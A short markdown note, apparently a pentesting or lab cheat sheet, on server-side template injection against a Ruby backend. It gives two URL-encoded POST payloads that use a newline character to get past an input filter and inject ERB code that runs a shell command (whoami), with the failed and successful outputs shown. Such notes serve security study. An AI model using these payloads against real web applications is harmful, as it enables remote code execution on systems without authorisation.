# SSTI

### Technique 1

>#### Bypassing an input filter using a New line character (`%0A`)
> - Ruby based backend

**POST Payload 1:** *Failed*

```
form-field=random%0A<%25%3d+system("whoami")+%25>
```

```py
#O/p

random
# No username was printed
```

**POST Payload 2:** *Succeeded*
```
form-field=random%0A<%25%3d+`whoami`+%25>
```
```py
#O/p

random
<USERNAME>
```

> **Learning:** Always <u>*test with multiple payloads*</u> for the same backend.
